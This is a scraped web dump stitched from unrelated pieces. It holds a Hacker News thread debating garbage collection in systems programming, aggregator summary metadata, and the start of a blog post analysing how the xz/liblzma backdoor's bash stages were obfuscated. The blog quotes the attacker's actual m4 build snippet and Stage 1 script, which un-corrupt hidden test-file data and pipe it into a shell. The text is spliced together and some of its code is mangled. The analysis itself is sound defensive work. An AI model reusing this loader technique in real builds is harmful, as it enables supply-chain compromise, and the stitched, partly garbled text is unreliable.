management. There is definitely a lack of control in contemporary managed languages (though it’s also far from perfect in low-level languages) for memory layout, but there are definitely ways to affect it. reply cb321 13 hours agorootparentI agree with your disagreement. As a case in point, Nim has packed bitfields but various choices in automatic memory management. As a concrete example, a spell-check custom-data store uses them here: https://github.com/c-blake/suggest/blob/04e313f8f8d3adf4cb55... (there the memory is in a memory mapped file and so that code has to manage the space itself.. so, maybe not the perfect example). But I also agree there tends to be a correlation in PLang design in avoiding both low-level memory layout and in manual memory management. But it's just a tendency, not fundamental. reply HippoBaro 14 hours agoprevFor the kind of software I write there are two cases: (1) the hot path for which I will always have custom allocators and avoid allocations and (2) everything else. For (1) GC or not it doesn’t make a difference, I’ll opt-out. For (2) GC is really convenient and correct. reply leapis 12 hours agoparentAgreed- I come from a Java/C++ shop where we tried to tackle this dichotomy with interop but it ended up causing more problems than it solved. A lot of the work that Java has done with modern garbage collectors is impressive, but even they admit (indirectly, via Valhalla) that no/low-alloc code has it's place. reply astrobe_ 1 hour agorootparent> no/low-alloc code has it's place ... Which is pretty large in the embedded firwmare field. However that's not systems programming but system (singular) programming. reply musicale 13 hours agoprevThe tricky part is identifying which systems programmers can be garbage collected and when. reply GeorgeTirebiter 13 hours agoparentSoylent Green was set in 2022/2023 https://en.wikipedia.org/wiki/Soylent_Green?useskin=vector reply SmartHypercube 10 hours agoprevUsing RCU as the example to motivate GC is interesting. It is essentially transferring the responsibility of freeing from the writer to the last reader, who cannot be determined when compiling. It makes a lot of sense. But this makes me thinking that, if I want more performance, should I further transfer the freeing from the reader to a dedicated batch process? The readers only update a mark / write into a queue or something. Every once in a while, a batch process collects all garbages and compacts. This way the readers don't have random additional overheads. > Lies people believe about memory management > The programmer knows the best times to pause for memory management. In my experience, there are many programs in which the programmer does know the best times to pause for memory management. For example, in games and crypto trading programs, I want to classify all computations into two priorities. I need to do an update / render a frame / compute a trading action in every time period. If it finishes before the deadline, I have nothing to do now and would like to collect some garbages. If the high-priority thing is using all the available time, for example, when the market is very active, I don't care too much about collecting garbages and would like to defer everything that is not strictly necessary to as late as possible. reply filleduchaos 9 hours agoparentThe very next line after the portion of the article you clipped is \"Sometimes there are obvious answers—like on the loading screen of a video game.\" reply SmartHypercube 8 hours agorootparentI'm not talking about the loading screen of a video game. reply worik 11 hours agoprevNot mentioned in this article is one thing that goes very well with GC is async/await I am a async/await hater for personal Idiosyncratic style reasons that I will not bore you with I use it a lot in Type/Java script. Have done so in Dart. Works as it should I have used it in Rust. IMO it is a disaster there. Shoehorning the sort of memory management required to use asyc/await with a multi threaded runtime is a hellscape https://doc.rust-lang.org/std/pin/index.html reply magicalhippo 18 hours agoprevA point that seems to get lost in many of the pro-GC articles, this one included from what I can see, is that memory is just one kind of resource. Correct code, especially in systems programming, will need to manage external resources as well, be it file handles, sockets or whatnot. GC only solves the application memory part, thus doesn't help at all for handling those external resources. In fact it can make it much more complicated, just look at what it takes to correctly implement a non-trivial IDispose in .Net. Other approaches like RAII or reference counting makes it much easier in my experience to handle both memory and external resources in a unified way, thus making it easier to write correct code and reason about it. That said, I'm not blatantly against GC's. It's a tool and it has some pros and cons, like everything else. The \"manual GC\" RCU approach mentioned in the article is interesting for certain tasks. reply yawaramin 5 hours agoparentRAII is of course great but any language with a GC and proper exception handling can handle resources safely. Eg look at Java's try-with-resources statement which guarantees that the resource will be disposed safely if an exception is raised: https://docs.oracle.com/javase/tutorial/essential/exceptions... You can build up quite resilient and resource-safe systems using these basic building blocks. reply tialaramex 17 hours agoparentprevYes, and the \"Memory Safety\" arguments apply to the other resources too. For example Rust eventually grew I/O safety, so your File Handles (in Unix, OwnedFd) or just straight up Handles (in Windows, OwnedHandle) are owned objects, not just integers like the number 4 At the surface this looks like it's just about avoiding dumb mistakes like using arithmetic on handles or mistakenly using reserved values as sentinels -- but the ownership model also means anything tricky we're doing with handles has explicit ownership, transparent to future maintainers. reply pron 18 hours agoparentprevThere is a big difference between memory and other resources, and that is that memory -- like processing -- is fundamental for any computation; not for nothing do most theoretical models of computation assume unbounded memory. Very few languages require manual allocation of processing -- even though that is done in some software like OS kernels and hard realtime applications -- and for similar reasons automatic memory management is very useful for abstracting computation, i.e. not leaking their details of memory by a subroutine to its clients just as this is rarely done for CPU use. So while every non-trivial computation involves some non-constant amount of processing and memory, I/O is usually done at the edges of the system. Management of I/O is very important, of course, but it's not as central to the notion of computation (and therefore to abstracting computation) as processing and memory. reply zwieback 18 hours agoparentprevSo true, moving from C++ to mostly C# I'm liking memory management by GC but hating tracking file handles, sockets, etc. RAII is something I really appreciated reply pjmlp 16 hours agorootparentUse Roslyn analysis that errors when using is forgotten in an IDisposable type, for example. By the way, in modern .NET, using makes use of structural typing. Any class or struct, with a Dispose() method can be referred to, no need to implement the interface, and can also be retrofitted via extension methods. reply osigurdson 14 hours agorootparentThis is strange advice. Why not just implement the IDisposable interface like normal C# code? Using extension methods for this is strange as well. Doing this even somewhat correctly would mean creating another class that implements IDisposable which can only work with public members of the original. In general best not to do weird stuff for no reason imo. reply pjmlp 2 hours agorootparentBecause you don't own the type? Using another class, or struct adds up to memory usage, and turns out some C and C++ folks are itchy with such solutions, not to mention the added issue of passing wrapper classes/structs around. reply neonsunset 18 hours agorootparentprev(SafeFileHandle is internally reference counted, but yes, worst case when you forget to .Dispose it, it waits in the finalizer queue for the GC to trigger the finalizer thread to process the items in it) reply pjmlp 16 hours agoparentprevYet, a point that tends to get lost when criticising GC languages, is that most of them have features for deterministic resource management, that many keep failing to learn. - Some do have RAII - Some do offer keywords - Some do arena like management, lambdas with implicit management - Some have a little help from the type system - Some do a bit of everything listed above Additionally, just like system developers have to rely on static analysers, the static analysers for those languages can also provide validation when something is forgotten, when the type system alone isn't enough. reply magicalhippo 11 hours agorootparentMy point though is that by moving memory management into \"don't care\" territory while still, obviously, requiring explicit handling of other resources, it's easier to forget or miss when you need to explicitly handle something. When instantiating objects in C# say I need to check the documentation or the source code to see if it implements IDisposable to know if I need to handle it. Lets say that for a given class X in library Y, it does not. So I don't worry, I just instantiate and don't do anything about the cleanup because GC will handle it. Later, the implementation of X changes and IDisposable is added to it. I now have to change my code, and not doing so could lead to serious production issues. Yet the compiler happily compiles my code without any warning. Sure some static analyzers might catch it, but they're not perfect, and you need to run them. A stock Visual Studio 2022 will not complain about the above scenario for example. In my experience it's much less error prone to unify memory and external resource management. If instead I had been using a different language which has a more uniform resource handling, the above change in class X would likely not have been a big deal. Also, my code will already be written with resource handling in mind. It can be non-trivial having to change a hierarchy of classes just because a dependency deep down suddenly had IDisposable added to it. I guess what I'm trying to say is that I think just focusing on memory management, that is to GC or not to GC, is having a myopic view things. I feel it's like arguing what kind of pickle to have on your burger without considering the other ingredients. Sure, the pickle is a crucial ingredient, but there's a lot more to it. reply pjmlp 2 hours agorootparentJust like a stock C or C++ compiler won't complain about the endless possibility of getting things wrong. Or to pick on IDisposable, you can repeat exactly everything you said regarding actually providing a destructor, properly implemented, taking into account class hierarchies, multiple inheritance, heap allocation, and being exception safe. Someone has to write those destructors. reply zvrba 1 hour agorootparentprev> In my experience it's much less error prone to unify memory and external resource management. Until threads and async enter the scene. reply pebal 9 hours agoparentprevHaving garbage collection (GC) in your toolkit doesn't mean you're limited to choosing between GC and deterministic destruction. You can integrate GC, stack allocation, and manual memory management within the same application. It's possible to leverage GC in a manner similar to how `shared_ptr` is used, providing both automated cleanup and precise control over object lifetime. For a practical example, consider SGCL: https://github.com/pebal/sgcl reply worik 11 hours agoparentprevYes. But... > GC only solves the application memory part, Except it does not. \"Solve\" that is. It helps, yes it does But as I have learnt the hard way (silly way too, to be truthful) GC will not help unless you actually delete all references to the unused memory Perhaps GC have developed magic moo cow properties in the twenty five years since I made that discovery, but I think the point remains GC is very helpful, but it does not stop resource leaks reply erik_seaberg 8 hours agorootparentIf unreachable objects point at each other, that's only a problem for refcounting, not for tracing (their pointers aren't followed). reply rbehrends 6 hours agoparentprevFirst, I have no desire to handle both memory and external resources in a unified way, because memory management and resource management have different needs. Memory is not just \"one kind of resource\", it's a very specific type of resource that if it has to be managed manually, inherently creates crosscutting concerns. And memory allocation is pervasive, often implicit in other language constructs. Garbage collectors get to cheat here, because they have a global view that ignores module boundaries and information hiding. The classical example is that introducing a caching mechanism usually introduces API breaks. Where a function normally returns a pointer/reference/unique pointer and makes the caller responsible for freeing memory (whether through convention such as in C or enforced/automated through language mechanisms such as in Rust), the moment you cache it, you need to return a reference-counted pointer, because now the memory can only be freed if both the caller and the cache don't use it anymore. And that change from a non-reference-counted pointer to a reference-counted pointer is a breaking API change. There are plenty more situations where manual memory management interacts poorly with modularity, such as filter() style functions, or the various complications that arise from closures capturing their local environment. Conversely, it is absolutely possible to have pretty straightforward resource management with guaranteed and predictable lifetimes in a GCed language (though, alas, there's a lack of direct language support for that). The general approach is as follows: Each resource's constructor takes an explicit or implicit owner argument (implicit being the current scope, whether defined through a language construct). You can also transfer a resource to a different owner (reparenting) [1]. Owners of resources can be lifetime managers such as scopes (but those do not need to correspond to lexical scopes and are more like transactions), that have more complex lifetime logic (such as a pool of resources) or objects that themselves are owned (e.g. if you have resources dependent on other resources). When the lifetime of the owner finishes, it calls a dispose function in all owned objects. Because an owner is required in order to construct such a resource object (unlike a C# using clause or Java's try-with-resources) by virtue of its constructor requiring it, it is impossible to accidentally create such a resource without a controlled lifetime [2]. Note that this is not the equivalent to RAII. You can have a number of non-owning references to such resource objects, essentially the equivalent of a weak pointer. In my experience, this is generally a good thing, because you do not want to have a hidden pointer secretly extending the lifetime of a potentially expensive resource. I prefer resource lifetimes to be explicit and to get an error if they are used past their intended lifetime. [1] Note that this is conceptually similar to talloc. https://talloc.samba.org/talloc/doc/html/index.html [2] Obviously, it is still possible in any language to do the equivalent of a raw fopen() call, but that's not something that RAII can fix, either. reply samatman 18 hours agoparentprev> GC only solves the application memory part, thus doesn't help at all for handling those external resources. This is far from entirely true. Most languages with a garbage collector have finalizers, which will clean that sort of thing up. Generally, and unlike memory allocation, one can call those finalizers from within user code, so as not to have to rely on the GC running. The distinction between reference counting and garbage collection is an artificial one. Reference counting is an approach to garbage collection, one with different tradeoffs from more concept-central algorithms for GC. I agree with you that it's a more unified approach to resource management, finalizers require user attention in a way which ordinary allocation doesn't, so yes, system resources get treated differently. I don't see that as a slam-dunk against them, however. reply cesarb 15 hours agorootparent> Most languages with a garbage collector have finalizers, which will clean that sort of thing up. Using finalizers for cleanup of non-memory resources is bad because they will only be called when there's memory pressure. If you have used all of your non-memory resource, but there's still plenty of free memory, the allocation of that resource will fail; if you instead force a garbage collection at that point, not only will you cause a pause, but also you will be collecting memory while there's still plenty of it available. reply PhilipRoman 14 hours agorootparentprevTrusting the GC with freeing externally observable resources will bring you some very painful bugs. On that note, it's 2024 and we still cannot unmap a mmapped file from Java in a timely manner. I really hope they do something about it. reply zozbot234 15 hours agorootparentprevFinalizers will be non-deterministic when called as part of GC. One advantage of reference counting is that it is deterministic (and yes, this means that sometimes freeing the last reference that's keeping a bunch of objects around will lead to a spike of extra deallocations. Guess what, that's what determinism is. It's implied by the need to free resources promptly.) reply o11c 17 hours agorootparentprevOne problem with finalizers, try-finally, try-with-resources, Python-`with`, etc. is that they don't actually guarantee the code will be called even in common cases. In particular, any function that returns a (possibly newly-constructed) open file handle has not yet informed the caller that it's actually a thing to keep track of, unlike with destructors which are active immediately once the object's lifetime begins, and only rely on `move` being relatively atomic. reply pjmlp 13 hours agorootparentYou use the C and C++ approach to all their design flaws and reach out to a static analysis tool that covers such cases. reply kaba0 14 hours agorootparentprevHow is a try-with-resources not guaranteed? At least in Java, it is guaranteed to run - plus, you can get your closing/destructor logic wrong in RAII languages as well. reply cesarb 14 hours agorootparent> How is a try-with-resources not guaranteed? At least in Java, it is guaranteed to run There's a subtle detail you have to be careful with, however: if you try to allocate memory or call a method between allocating your resource and actually doing the try-with-resources, you might get an OutOfMemoryError or a StackOverflowError, and your resource will leak. That is, if you do something like: try (MyHolder holder = new MyHolder(allocateResource())) { ... } You can have a leak if the memory allocation in the \"new MyHolder()\" fails, or if there's not enough space in the stack to call the MyHolder constructor. > plus, you can get your closing/destructor logic wrong in RAII languages as well. For instance, in C++ you can accidentally put your resource in a temporary which is immediately destructed at the end of the line, when you wanted it to last until the end of the enclosing scope. Rust makes it harder for this to happen, but it's still possible. reply o11c 11 hours agorootparentprevI mean, it's possible to write bad code in C++. But at least it's possible to write good code too. C++ makes a careful sequence that's hard to get wrong and easily compiler enforced: * if a given subobject (field or base class)'s constructor runs, its destructor is guaranteed to run. * in particular, in low-level ownership classes, you can arrange for field initializers to be `noexcept`, so you get to run their dtor, regardless of subsequent manipulation of the fields - just be sure to not assume invariants from the fully-constructed main object case. In most classes, deferring all ownership logic to the fields is simpler - rule of zero beats rule of 5. And if you do add manual try-catch during construction it will actually work. Languages other than C++ generally fail in several ways: * Allow exceptions to be thrown by the runtime for reasons unrelated to the code being executed * No support for subobjects, forcing all objects to be allocated separately and thus the runtime not knowing it needs to poke them since finalizers are only applied to objects not pointers. In particular, Python's `contextlib.ExitStack` can narrow the window in which case leaks are possible, but not eliminate it. Rust does slightly better than C++ by enforcing trivial moves, at the cost of making many useful programs impossible to write. reply worik 11 hours agorootparentOuch! > Rust does slightly better than C++ by enforcing trivial moves, at the cost of making many useful programs impossible to write. What \"useful\" programs fit a useful definition of \"many\"? It makes self referential looped data structures hard to write (double linked lists, trees with pointers to parents). No loss. Great improvement to have fewer of those It makes arbitrary allocation hard. Enforces behaviors. Makes a programmer think very hard. \"useful programs impossible to write. \" No it does not. It ,ages a lot of bad ideas hard to implement, makes nothing \"impossible \" reply o11c 9 hours agorootparentGood luck implementing \"peer pointers\" in Rust. Zero allocation involved, trivial to do safely in C++. class A { /* can be NULL if detached */ B *peer; /* other fields generally exist in one of the classes. */ /* useful objects are typically created in pairs, but can be constructed detached if needed */ /* move ctor and swap keep the (value) objects pointing at each other */ /* move assignment and dtor call detach() on the overwritten/expiring object */ /* Often separate \"detach and cancel\" and \"detach without canceling\" are useful */ void detach(); /* other functions specific to the peerage */ }; class B { A *peer; /* same API as `class A`, but usually most of it is only used via one owner. */ /* In my experience, generally one class's instance goes in some collection of centralized objects like an event loop, and the other is used as a handle to it. */ }; I guess we could always use the usual Rust solution of \"screw ownership and efficiency, just shove everything in an `Rc>`\". reply PaulDavisThe1st 15 hours agoprevI quoted this in another comment here, but just to highlight one of the best couple of sentences in TFA: > Tools to automate the “actually freeing the memory” part, like lifetimes in Rust and RAII in C++, don’t solve these problems. They absolutely aid correctness, something else you should care deeply about, but they do nothing to simplify all this machinery. reply mgaunard 18 hours agoprevI do a lot of different types of systems programming. Only times I actually use GC is to manage resources other than memory. reply atum47 17 hours agoprevI once enabled garbage collection for this software I was writing and it collected everything. reply ervine 17 hours agoparentSprayed spot remover on my dog. Next day he was gone. reply netbioserror 18 hours agoprevI use Nim in production. It defaults to RC. The biggest benefit of runtime automatic memory management that rarely gets mentioned: You can easily eliminate almost all memory semantics from a typical server-side program. My code is 99.9% business logic, with the 0.1% being a couple procedures which interface to a C library. Hardcore manual memory people seem to have completely misaligned priorities to real-world concerns. Maintainability, safety, productivity, and iteration speed seem to be bottom-of-list to the egotistic holy grail be being able to say they write their own memory routines. If they're not in an embedded context, I'm really unsure why anyone paying them to write code should care what they have to say. They're not talking about increasing robustness and reducing costs, so what the hell are they even rambling about? I've had too many of these debates in-person face-to-face with people who can't match my ability to deliver. The vast majority of us are not smarter than the compiler, and are not smarter than automatic MM routines. Those who are write compilers and GCs. They don't work on the same programs we all write, just memory managed. It's the worst-kept secret that the remaining contexts where manual management is used often have the worst-maintained spaghetti codebases, leading to disasters, whistleblown scandles, and hush-hush covered catastrophes waiting in the wings while people get the hell out of dodge before they blow. It's all duct tape and prayers. Having had to inspect and translate procedures from a deliberately obfuscated spaghetti C codebase, my position on this is going to be hard to budge. Experience is an unbeatable Bayesian prior. reply zozbot234 15 hours agoparentMost systems programming languages don't have fully manual memory management these days - they use RAII. Manual deallocation is possible, but not used often. reply yawaramin 5 hours agorootparentAmusing segfault in 10 lines of Modern C++ with RAII: #include#includeint main(int argc, char* argv[]) { auto s = std::make_unique(\"hello\"); std::unique_ptr s2 = std::move(s); std::coutI have no experience making a live always-running Nim application, so I can't speak to that. But in the context I use it, it's incredible. I have done this several ways quite successfully. Firstly, instead of \"%cpu\" I tend to measure \"10s..100s of parts per billion\" CPU from a like ~100 lines of code \"cron library\" that I use instead of system cron demons: https://github.com/c-blake/cron -- seeing 40 ppb on one box and 73 ppb on another at the moment. Another example might be https://github.com/c-blake/bu/blob/main/doc/dirq.md which is a kind of ad hoc demon to monitor however many directories on Linux with inotify and then launch user-commands against dropped in files. This can be a sort of Plan 9 \"plumb\" style thing. E.g., one of the directories I monitor is a browser download directory. So, one click to save and them boom - a potential cascade of activity. (EDTI: This is clocking in at about 9572177ns/(48*3600s) =~ 55 parts per billion for me right now.) As a final example, I got annoyed with the unwanted complexity of modern syslog junk. So, I whipped up https://github.com/c-blake/kslog which just looking it up for this post, according to /proc/PID/schedstat has only accumulated about 27357590/(24*3600+24*60) =~ 311 parts per billion of 1 CPU on a 4-core system since boot about 24h:24m ago. This in about 25% of the lines of Nim code that busybox spends on less useful C code (to your point of \"almost all the code is the actual logic, not other junk\"). Also, while it is not as full-featured as stdlib `string`, there is a zero-copy `cligen/mslice.MSlice` type (https://github.com/c-blake/cligen/blob/master/cligen/mslice....) that does have basic features like splitting and number parsing. There are probably others out in the Nimbleverse. If view types ever migrate from experimental status to relied-upon that might become less interesting. Since you do a lot of statistics, you might also appreciate the fmtUncertain* subsystem of https://github.com/c-blake/cligen/blob/master/cligen/strUt.n... which allows you to retain only meaningful number of digits and also https://github.com/c-blake/adix/blob/master/adix/mvstat.nim which has efficient moving quantiles via a Fenwick Tree logarithmic histogram. reply CyberDildonics 13 hours agoparentprevHardcore manual memory people seem to have completely misaligned priorities to real-world concerns. Maintainability, safety, productivity, and iteration speed seem to be bottom-of-list to the egotistic holy grail be being able to say they write their own memory routines. I think you've gotten very worked up over a theoretical boogieman person that doesn't exist. Most natively compiled programs are written in C++ with Rust as a distant second and both put a lot of effort into the selling point that you don't have to manually manage memory the same way you do with C and can do with ownership. I've never seen anyone like you're describing. reply netbioserror 13 hours agorootparentI have met people like that. Sorry. reply samatman 18 hours agoprevThis skirts around the edge of an observation which I want to dive into, which is that modern user OSes (anything which isn't a specialized RTOS) has built-in garbage collection. We just don't call it that: we just call it memory management. What do we call languages with a built in GC? Memory-managed languages! You see this in a lot of older \"top-to-bottom\" C programs: they allocate, they clean up system resources (using longjmp to one label), but they don't bother with free. When the program exits the OS gets all that memory back anyway, so why bother? There's a missed opportunity here, to have an OS with a garbage collector with less isolation from programs, one which handles resources more like a language's runtime GC. It will probably stay missed, because in the typical GCed language, the GC is intricately built into practically every line of the runtime, so it's not really practical to make a distribution of that language for one OS which hands that control over to the operating system. But it's a pity, because there's a lot of room to improve some of the chronic problems we see from this artificial isolation of program-level memory management from OS level. reply flohofwoe 18 hours agoparent> You see this in a lot of older \"top-to-bottom\" C programs: they allocate, they clean up system resources (using longjmp to one label), but they don't bother with free. When the program exits the OS gets all that memory back anyway, so why bother? You don't need to bother with releasing other types of resources either though (files, sockets, threads, ...), since the operating system will take care of that on process exit (unless you are on AmigaOS). The only reason to free memory is to recycle that memory in other allocations in long running applications without grabbing new memory from the OS. For one-shot command line tools it's usually not needed. reply ninkendo 12 hours agoparentprevThe OS only knows it can free memory when your process exits (same as file handles and other resources.) If your process is designed to exit once it's done its job, you can use the OS as a garbage collector. Having an operating system know when memory is unused within your running program is not something that has ever existed though (except for perhaps some esoteric research OS's.) I wouldn't say we're missing an opportunity, because the thing we're missing doesn't exist in any meaningful sense. On the other hand, a programming methodology that uses very simple, short-lived programs is a totally legitimate way to do things... it's how CLI tools and the scripting languages that script them work, it's how web servers used to work (with CGI/etc), and it's a perfectly reasonable approach even today. reply kaba0 14 hours agoparentprevIn Java, the Epsilon GC is just that. reply bckr 18 hours agoprevOff topic but what is going on in the picture of the leaking pipe? I don’t think it’s AI but there’s a third arm in there that I don’t understand. There’s at least two guys in the picture but I can’t assign one of the arms to either of them. reply deutschepost 18 hours agoparentIt's three people. The guy on the right is leaning over another one under the water. It's probably a picture from a flood training simulator. Edit: https://commons.wikimedia.org/wiki/File:US_Navy_040308-N-000... The picture was uploaded in 2009. Downvote if you want, but there is no AI at work here. reply mindv0rtex 18 hours agoparentprevIt's definitely AI generated, that picture makes no sense. reply spintin 18 hours agoprevOr you just use static atomic variables no? I mean it wont solve your race conditions but it also wont crash. And it will be VERY fast because parallelism without cache misses! I wish there was a Java with C struct JNI access. reply yvdriess 18 hours agoparentSaying this as a big hardware atomics enjoyer: Static atomic variables are not fast, are not parallel and definitely are the worst kind of cache misses. Atomics are also atomic only on that one single operation, such as manipulating a single number in a struct or swapping out a pointer from one version of an object to another. To atomically expose a set of changes to a datastructure, you either use a lock or swap the old for the new, which is the driving example in the article. reply gmokki 4 hours agoparentprevModern Java does support directly calling C functions, with structs. And also upcalls back to java. All without any JNI style preprocessing or stubs. https://docs.oracle.com/en/java/javase/21/core/calling-c-lib... reply bugbuddy 18 hours agoparentprevThis is false. Depending on the CPU Arch, updating a shared static atomic variable may cause cache invalidation. How fast depends on how hot and tight you critical sections are. reply neonsunset 17 hours agoparentprevIt's called C# (supporting plain C structs is just a small part of its low-level features) reply pjmlp 16 hours agorootparentOr D, available as official fronted language on GCC and LLVM projects, :) reply bsdpufferfish 15 hours agoprev [–] Why are they always trying to sell these things to audiences who are not interested? reply GuidelinesFAQListsAPISecurityLegalApply to YCContact Search:",
    "originSummary": [
      "The article delves into the performance sensitivity of operating systems, emphasizing the importance of concurrency in optimizing kernels and drivers.",
      "Introduces Read, Copy, Update (RCU) as a method for data sharing between threads without locks, underscoring its advantages and possible drawbacks.",
      "Challenges myths about garbage collection and manual memory management, promoting the efficiency and benefits of contemporary garbage collection methods, advocating for their use in software development."
    ],
    "commentSummary": [
      "The text explores memory management in programming languages, covering garbage collection, reference counting, manual memory management, and ownership models.",
      "It compares memory management strategies in languages like Rust, Nim, and C++, discussing performance, resource efficiency, and latency trade-offs.",
      "Emphasizes the importance of clean-up, precise object lifetime control, and resource management in programming, highlighting the crucial role of memory management in computation and optimization."
    ],
    "points": 322,
    "commentCount": 173,
    "retryCount": 0,
    "time": 1711796634
  },
  {
    "id": 39878681,
    "title": "Backdoor in Xz/liblzma: Unveiling Bash-Stage Obfuscation",
    "originLink": "https://gynvael.coldwind.pl/?lang=en&id=782",
    "originBody": "Return to dashboard ⇪ Sections lang:RSS:About me Tools → YT YouTube (EN) → D Discord → M Mastodon → T Twitter → GH GitHub My company's website Paged Out! zine Links / Blogs → dragonsector.pl → vexillium.org Security/Hacking: j00ru's blog lcamtuf's blog invisible things (new) invisible things (old) liveoverflow's site /dev/null's site pi3's blog icewall's blog taviso's blog pawel's blog sandeep's blog koto's blog carstein's blog zaufana trzecia strona niebezpiecznik sekurak Reverse Eng./Low-Level: rewolf's blog gdtr spinning mirrors security news rev3rsed Programming/Code: /dev/krzaq sil2100/vx's web log adam sawicki devkk.net xion.log Posts xz/liblzma: Bash-stage Obfuscation Explained, Two of my bookmarklets: image extraction and simple TTS, Paged Out! #3 is out, My howto script, Talk: PCI Express to Hell, Live: On Leaving Google and What's Next, Thoughts on overlarge fields in formats and protocols, On self-healing code and the obvious issue, LLM + Clean Room: Will LLMs be the death of code copyrights?, Solving a VM-based CTF challenge without solving it properly, → see all posts on main page // copyright © Gynvael Coldwind // design & art by Xa // logo font (birdman regular) by utopiafonts / Dale Harris /* the author and owner of this blog hereby allows anyone to test the security of this blog (on HTTP level only, the server is not mine, so let's leave it alone ;>), and try to break in (including successful breaks) without any consequences of any kind (DoS attacks are an exception here) ... I'll add that I planted in some places funny photos of some kittens, there are 7 of them right now, so have fun looking for them ;> let me know if You find them all, I'll add some congratz message or sth ;> */ Vulns found in blog: * XSS (pers, user-inter) by ged_ * XSS (non-pers) by Anno & Tracerout * XSS (pers) by Anno & Tracerout * Blind SQLI by Sławomir Błażek * XSS (pers) by Sławomir Błażek 2024-03-30: xz/liblzma: Bash-stage Obfuscation Explained xz:liblzma Yesterday Andres Freund emailed oss-security@ informing the community of the discovery of a backdoor in xz/liblzma, which affected OpenSSH server (huge respect for noticing and investigating this). Andres' email is an amazing summary of the whole drama, so I'll skip that. While admittedly most juicy and interesting part is the obfuscated binary with the backdoor, the part that caught my attention – and what this blogpost is about – is the initial part in bash and the simple-but-clever obfuscation methods used there. Note that this isn't a full description of what the bash stages do, but rather a write down of how each stage is obfuscated and extracted. P.S. Check the comments under this post, there are some good remarks there. Before we begin We have to start with a few notes. First of all, there are two versions of xz/liblzma affected: 5.6.0 and 5.6.1. Differences between them are minor, but do exist. I'll try to cover both of these. Secondly, the bash part is split into three (four?) stages of interest, which I have named Stage 0 (that's the start code added in m4/build-to-host.m4) to Stage 2. I'll touch on the potential \"Stage 3\" as well, though I don't think it has fully materialized yet. Please also note that the obfuscated/encrypted stages and later binary backdoor are hidden in two test files: tests/files/bad-3-corrupt_lzma2.xz and tests/files/good-large_compressed.lzma. Stage 0 As pointed out by Andres, things start in the m4/build-to-host.m4 file. Here are the relevant pieces of code: ... gl_[$1]_config='sed \\\"r\\\" $gl_am_configmakeeval $gl_path_map$gl_[$1]_prefix -d 2>/dev/null' ... gl_path_map='tr \"\\t \\-_\" \" \\t_\\-\"' ... This code, which I believe is run somewhere during the build process, extracts Stage 1 script. Here's an overview: Bytes from tests/files/bad-3-corrupt_lzma2.xz are read from the file and outputted to standard output / input of the next step – this chaining of steps is pretty typical throughout the whole process. After everything is read a newline () is added as well. The second step is to run tr (translate, as in \"map characters to other characters\", or \"substitute characters to target characters\"), which basically changes selected characters (or byte values) to other characters (other byte values). Let's work through a few features and examples, as this will be imporant later. The most basic use looks like this: echo \"BASH\"tr \"ABCD\" \"1234\" 21SH What happend here is \"A\" being mapped to (translated to) \"1\", \"B\" to \"2\", and so on. Instead of characters we can also specify ranges of characters. In our initial example we would just change \"ABCD\" to \"A-D\", and do the same with the target character set: \"1-4\": echo \"BASH\"tr \"A-D\" \"1-4\" 21SH Similarly, instead of specyfing characters, we can specify their ASCII codes... in octal. So \"A-D\" could be changed to \"\\101-\\104\", and \"1-4\" could become \"\\061-\\064\". echo \"BASH\"tr \"\\101-\\104\" \"\\061-\\064\" 21SH This can also be mixed - e.g. \"ABCD1-9\\111-\\115\" would create a set of A, B, C, D, then numbers from 1 to 9, and then letters I (octal code 111), J, K, L, M (octal code 115). This is true both for the input characters set and the target character set. Going back to the code, we have tr \"\\t \\-_\" \" \\t_\\-\", which does the following substitution in bytes streamed from the tests/files/bad-3-corrupt_lzma2.xz file: 0x09 (\\t) are replaced with 0x20, 0x20 (whitespace) are replaced with 0x09, 0x2d (-) are replaced with 0x5f, 0x5f (_) are replaced with 0x2d, This actually \"uncorrupts\" the bad-3-corrupt_lzma2.xz, which forms a proper xz stream again. In the last step of this stage the fixed xz byte stream is extracted with errors being ignored (the stream seems to be truncated, but that doesn't matter as the whole meaningful output has already been written out). The outcome of this is the Stage 1 script, which is promptly executed. Stage 1 In Andres' email that's the bash file starting with \"####Hello####\", which is pretty short, so let's present it here with differences between 5.6.0 and 5.6.1 marked with black background. ####Hello#### # a few binary bytes here, but as it's a comment they are ignorred [ ! $(uname) = \"Linux\" ] && exit 0 [ ! $(uname) = \"Linux\" ] && exit 0 [ ! $(uname) = \"Linux\" ] && exit 0 [ ! $(uname) = \"Linux\" ] && exit 0 [ ! $(uname) = \"Linux\" ] && exit 0 eval `grep ^srcdir= config.status` if test -f ../../config.status;then eval `grep ^srcdir= ../../config.status` srcdir=\"../../$srcdir\" fi export i=\"((head -c +1024 >/dev/null) && head -c +2048 && (head -c +1024 >/dev/null) && head -c +2048 && (head -c +1024 >/dev/null) && head -c +2048 && (head -c +1024 >/dev/null) && head -c +2048 && (head -c +1024 >/dev/null) && head -c +2048 && (head -c +1024 >/dev/null) && head -c +2048 && (head -c +1024 >/dev/null) && head -c +2048 && (head -c +1024 >/dev/null) && head -c +2048 && (head -c +1024 >/dev/null) && head -c +2048 && (head -c +1024 >/dev/null) && head -c +2048 && (head -c +1024 >/dev/null) && head -c +2048 && (head -c +1024 >/dev/null) && head -c +2048 && (head -c +1024 >/dev/null) && head -c +2048 && (head -c +1024 >/dev/null) && head -c +2048 && (head -c +1024 >/dev/null) && head -c +2048 && (head -c +1024 >/dev/null) && head -c +2048 && (head -c +1024 >/dev/null) && head -c +939)\";(xz -dc $srcdir/tests/files/good-large_compressed.lzma|eval $i|tail -c +31233|tr \"\\114-\\321\\322-\\377\\35-\\47\\14-\\34\\0-\\13\\50-\\113\" \"\\0-\\377\")|xz -F raw --lzma1 -dc|/bin/sh ####World#### The first difference are the random bytes in the comment on the second line. In version 5.6.0 it's 86 F9 5A F7 2E 68 6A BC, and in 5.6.1 that's E5 55 89 B7 24 04 D8 17. I'm not sure if these differences are meaningful in any way, but wanted to note it. The check whether the script is running on Linux was added in 5.6.1, and the fact that it's repeated 5 times makes this pretty funny – was someone like \"oops, forgot this last time and it cause issues, better put it in 5 times as an atonement!\"? We'll get back to the remaining differences later, but for now let's switch to Stage 2 extraction code, which is that huge export i=... line with a lot of heads. As previously, let's go step by step: The export i=... at the beginning is basically just a function \"definition\". It's being invoked in step 3 (as well as in Stage 2), so we'll get to it in a sec (also, it's simpler than it looks). The first actual step in the extraction process of Stage 2 is the decompression (xz -dc) of the good-large_compressed.lzma file to standard output. This, as previously, starts a chain of outputs of one step being used as inputs in the next one. Now we get to the i function invocation (eval $i). This function is basically a chain of head calls that either output the next N bytes, or skip (ignore) the next N bytes. At the very beginning we have this: 